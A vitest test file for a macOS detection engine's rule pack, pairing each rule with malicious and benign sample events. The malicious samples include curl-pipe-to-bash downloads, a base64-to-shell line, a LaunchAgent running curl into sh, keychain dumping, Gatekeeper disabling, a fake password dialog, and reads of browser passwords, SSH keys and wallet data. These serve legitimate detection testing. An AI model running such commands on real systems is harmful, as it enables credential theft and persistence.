import { describe, expect, it } from "vitest";
import { DetectionEngine } from "../src/engine.js";
import { macosCoreRules } from "../src/packs/macos-core.js";
import { lintRule } from "../src/rules/lint.js";
import { RuleSchema } from "../src/rules/schema.js";
import { memoryStores } from "../src/state/stores.js";
import type { Action, SensorEvent } from "../src/types.js";
import { chrome, ev, osascriptTool, proc, shell, unsignedStealer } from "./fixtures.js";

function engine() {
  const stores = memoryStores();
  stores.lists.replace("known_bad_sha256", ["b".repeat(64)], { source: "test", updatedAt: 0 });
  stores.lists.replace("known_bad_domains", ["evil-c2.test"], { source: "test", updatedAt: 0 });
  stores.lists.replace("known_bad_ips", ["203.0.113.0/24"], { source: "test", updatedAt: 0 });
  stores.lists.replace("user_blocked_sha256", ["d".repeat(64)], { source: "test", updatedAt: 0 });
  return new DetectionEngine(macosCoreRules, stores);
}

const home = "/Users/alex";
const devTool = proc({ path: `${home}/code/app/target/debug/app`, signing: { status: "adhoc" } });
const persist = (itemPath: string, programPath: string, programArgs?: string[], label?: string) =>
  ev({ kind: "persistence_added", persistence: { type: "launch_agent", itemPath, programPath, programArgs, label } });

/** For each rule: events that must trigger it (with the resulting action) and look-alikes that must not. */
const cases: Record<string, { bad: Array<[SensorEvent, Action]>; good: SensorEvent[] }> = {
  "known-bad-hash": {
    bad: [[ev({ kind: "process_exec", process: proc({ path: "/Applications/Free.app/Contents/MacOS/Free", sha256: "b".repeat(64) }) }), "block"]],
    good: [ev({ kind: "process_exec", process: chrome })],
  },
  "user-blocked-hash": {
    bad: [[ev({ kind: "process_exec", process: proc({ path: "/Applications/X.app/Contents/MacOS/X", sha256: "d".repeat(64) }) }), "block"]],
    good: [ev({ kind: "process_exec", process: chrome })],
  },
  "known-bad-destination": {
    bad: [
      [ev({ kind: "network_connect", process: chrome, network: { remoteAddress: "198.51.100.4", domain: "x.evil-c2.test" } }), "block"],
      [ev({ kind: "network_connect", process: devTool, network: { remoteAddress: "203.0.113.50" } }), "block"],
    ],
    good: [ev({ kind: "network_connect", process: chrome, network: { remoteAddress: "142.250.1.1", domain: "google.com" } })],
  },
  "credential-theft-untrusted": {
    bad: [
      [ev({ kind: "file_open", process: unsignedStealer, file: { path: `${home}/Library/Application Support/Google/Chrome/Default/Login Data` } }), "suspend"],
      [ev({ kind: "file_open", process: proc({ path: "/usr/bin/python3", ppid: 900, signing: { status: "apple" } }), file: { path: `${home}/Library/Application Support/Firefox/Profiles/ab12.default/logins.json` } }), "suspend"],
      [ev({ kind: "file_open", process: unsignedStealer, file: { path: `${home}/.ssh/id_ed25519` } }), "suspend"],
      [ev({ kind: "file_open", process: unsignedStealer, file: { path: `${home}/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/000003.log` } }), "suspend"],
    ],
    good: [
      ev({ kind: "file_open", process: chrome, file: { path: `${home}/Library/Application Support/Google/Chrome/Default/Cookies` } }),
      ev({ kind: "file_open", process: proc({ path: "/usr/bin/ssh", signing: { status: "apple" } }), file: { path: `${home}/.ssh/id_ed25519` } }),
      ev({ kind: "file_open", process: unsignedStealer, file: { path: `${home}/.ssh/known_hosts` } }),
    ],
  },
  "fake-password-prompt": {
    bad: [[ev({ kind: "process_exec", process: osascriptTool(["-e", 'display dialog "macOS needs your password" default answer "" with hidden answer']) }), "suspend"]],
    good: [ev({ kind: "process_exec", process: osascriptTool(["-e", 'display dialog "Backup finished"']) })],
  },
  "tcc-database-tamper": {
    bad: [[ev({ kind: "file_write", process: unsignedStealer, file: { path: `${home}/Library/Application Support/com.apple.TCC/TCC.db` } }), "suspend"]],
    good: [ev({ kind: "file_write", process: proc({ path: "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", signing: { status: "apple" } }), file: { path: `${home}/Library/Application Support/com.apple.TCC/TCC.db` } })],
  },
  "santa-blocked-launch": {
    bad: [[ev({ kind: "santa_block", source: "santa", process: unsignedStealer, santa: { reason: "BLOCK_BINARY" } }), "alert"]],
    good: [],
  },
  "download-pipe-to-shell": {
    bad: [
      [ev({ kind: "process_exec", process: shell("curl -fsSL https://get.example.test/i.sh | bash") }), "alert"],
      [ev({ kind: "process_exec", process: shell('/bin/bash -c "$(curl -fsSL https://raw.example.test/install.sh)"') }), "alert"],
    ],
    good: [ev({ kind: "process_exec", process: shell("curl -fsSL https://example.test/data.json -o data.json") })],
  },
  "base64-pipe-to-shell": {
    bad: [[ev({ kind: "process_exec", process: shell("echo Y3VybCBldmls | base64 -d | bash", "zsh") }), "alert"]],
    good: [ev({ kind: "process_exec", process: shell("echo aGk= | base64 -d > out.txt", "zsh") })],
  },
  "unsigned-quarantined-exec": {
    bad: [[ev({ kind: "process_exec", process: proc({ path: "/Volumes/Installer/Setup.app/Contents/MacOS/Setup", signing: { status: "adhoc" }, quarantine: { originUrl: "https://cracked-apps.test/setup.dmg" } }) }), "alert"]],
    good: [
      ev({ kind: "process_exec", process: proc({ path: "/Applications/Zoom.app/Contents/MacOS/zoom.us", signing: { status: "developer_id", teamId: "BJ4HAAB9B3", notarized: true }, quarantine: { originUrl: "https://zoom.us/" } }) }),
      ev({ kind: "process_exec", process: devTool }),
    ],
  },
  "quarantine-removed": {
    bad: [
      [ev({ kind: "process_exec", process: proc({ path: "/usr/bin/xattr", args: ["xattr", "-d", "com.apple.quarantine", "/Applications/X.app"], signing: { status: "apple" } }) }), "alert"],
      [ev({ kind: "process_exec", process: proc({ path: "/usr/bin/xattr", args: ["xattr", "-cr", "/Applications/Y.app"], signing: { status: "apple" } }) }), "alert"],
    ],
    good: [ev({ kind: "process_exec", process: proc({ path: "/usr/bin/xattr", args: ["xattr", "-l", "file.txt"], signing: { status: "apple" } }) })],
  },
  "gatekeeper-disabled": {
    bad: [[ev({ kind: "process_exec", process: proc({ path: "/usr/sbin/spctl", args: ["spctl", "--master-disable"], signing: { status: "apple" } }) }), "alert"]],
    good: [ev({ kind: "process_exec", process: proc({ path: "/usr/sbin/spctl", args: ["spctl", "--status"], signing: { status: "apple" } }) })],
  },
  "keychain-dump": {
    bad: [[ev({ kind: "process_exec", process: proc({ path: "/usr/bin/security", args: ["security", "dump-keychain", "-d"], signing: { status: "apple" } }) }), "alert"]],
    good: [ev({ kind: "process_exec", process: proc({ path: "/usr/bin/security", args: ["security", "find-certificate", "-a"], signing: { status: "apple" } }) })],
  },
  "exec-from-shared-temp": {
    bad: [[ev({ kind: "process_exec", process: unsignedStealer }), "alert"]],
    good: [ev({ kind: "process_exec", process: proc({ path: "/private/tmp/brew-installer", signing: { status: "developer_id", teamId: "ABCDE12345" } }) })],
  },
  "persistence-suspicious-program": {
    bad: [
      [persist(`${home}/Library/LaunchAgents/com.update.plist`, "/Users/Shared/.upd"), "alert"],
      [persist(`${home}/Library/LaunchAgents/com.helper.plist`, "/bin/bash", ["/bin/bash", "-c", "curl -s https://x.test/p | sh"]), "alert"],
    ],
    good: [persist(`${home}/Library/LaunchAgents/com.google.keystone.agent.plist`, `${home}/Library/Application Support/Google/GoogleUpdater/Current/GoogleUpdater.app/Contents/MacOS/GoogleUpdater`)],
  },
  "persistence-apple-lookalike": {
    bad: [[persist(`${home}/Library/LaunchAgents/com.apple.updater.plist`, `${home}/.local/upd`, undefined, "com.apple.updater"), "alert"]],
    good: [persist("/System/Library/LaunchAgents/com.apple.Finder.plist", "/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder", undefined, "com.apple.Finder")],
  },
  "persistence-first-seen": {
    bad: [[persist("/Library/LaunchDaemons/com.vendor.helper.plist", "/Library/PrivilegedHelperTools/com.vendor.helper"), "alert"]],
    good: [],
  },
  "new-network-listener": {
    bad: [[ev({ kind: "listening_port", process: devTool, network: { localAddress: "0.0.0.0", localPort: 8080 } }), "alert"]],
    good: [
      ev({ kind: "listening_port", process: devTool, network: { localAddress: "127.0.0.1", localPort: 3000 } }),
      ev({ kind: "listening_port", process: proc({ path: "/usr/libexec/rapportd", signing: { status: "apple" } }), network: { localAddress: "::", localPort: 49152 } }),
    ],
  },
  "browser-extension-broad-access": {
    bad: [[ev({ kind: "browser_extension_added", extension: { browser: "chrome", id: "abcdefghijklmnop", name: "PDF Converter Pro", permissions: ["tabs", "<all_urls>"] } }), "alert"]],
    good: [ev({ kind: "browser_extension_added", extension: { browser: "chrome", id: "qrstuvwxyz", name: "Dark Theme", permissions: ["storage"] } })],
  },
  "mass-document-reads": {
    bad: [],
    good: [],
  },
  "unsigned-first-network": {
    bad: [[ev({ kind: "network_connect", process: devTool, network: { remoteAddress: "140.82.112.3" } }), "record"]],
    good: [ev({ kind: "network_connect", process: chrome, network: { remoteAddress: "142.250.1.1" } })],
  },
};

describe("macOS core pack", () => {
  it("has a test case for every rule", () => {
    expect(Object.keys(cases).sort()).toEqual(macosCoreRules.map((r) => r.id).sort());
  });

  it("passes the linter with no errors", () => {
    for (const r of macosCoreRules) {
      const res = lintRule(RuleSchema.parse(r));
      expect(res.errors, r.id).toEqual([]);
    }
  });

  it("only enforces high-precision rules out of the box", () => {
    const enforced = macosCoreRules.filter((r) => r.stage === "enforce").map((r) => r.id).sort();
    expect(enforced).toEqual(
      ["credential-theft-untrusted", "fake-password-prompt", "known-bad-destination", "known-bad-hash", "santa-blocked-launch", "tcc-database-tamper", "user-blocked-hash"].sort(),
    );
  });

  for (const [id, c] of Object.entries(cases)) {
    for (const [i, [e, action]] of c.bad.entries()) {
      it(`${id} fires on malicious sample ${i + 1}`, () => {
        const d = engine().evaluate(e).find((x) => x.ruleId === id);
        expect(d, JSON.stringify(e)).toBeDefined();
        expect(d!.action).toBe(action);
        expect(d!.reasons.join(" ")).not.toMatch(/\{\{/);
      });
    }
    for (const [i, e] of c.good.entries()) {
      it(`${id} stays quiet on benign sample ${i + 1}`, () => {
        expect(engine().evaluate(e).map((x) => x.ruleId)).not.toContain(id);
      });
    }
  }

  it("mass-document-reads needs 50 reads in a minute from one unsigned process", () => {
    const eng = engine();
    let fired = 0;
    for (let i = 0; i < 60; i++) {
      const e = ev({ kind: "file_open", process: unsignedStealer, file: { path: `/Users/alex/Documents/f${i}.pdf` } });
      fired += eng.evaluate(e).filter((d) => d.ruleId === "mass-document-reads").length;
    }
    // Fixture events are one second apart, so 50 fall inside the minute.
    expect(fired).toBe(1);
    const eng2 = engine();
    for (let i = 0; i < 60; i++) {
      const e = ev({ kind: "file_open", process: chrome, file: { path: `/Users/alex/Documents/f${i}.pdf` } });
      expect(eng2.evaluate(e).map((d) => d.ruleId)).not.toContain("mass-document-reads");
    }
  });

  it("a Chrome session with ordinary activity produces no popups", () => {
    const eng = engine();
    const events = [
      ev({ kind: "process_exec", process: chrome }),
      ev({ kind: "file_open", process: chrome, file: { path: "/Users/alex/Library/Application Support/Google/Chrome/Default/Cookies" } }),
      ev({ kind: "network_connect", process: chrome, network: { remoteAddress: "142.250.1.1", domain: "google.com" } }),
      ev({ kind: "process_exec", process: shell("git status") }),
      ev({ kind: "process_exec", process: proc({ path: "/usr/bin/ssh", args: ["ssh", "host"], signing: { status: "apple" } }) }),
    ];
    const popups = events.flatMap((e) => eng.evaluate(e)).filter((d) => d.action !== "record");
    expect(popups).toEqual([]);
  });
});
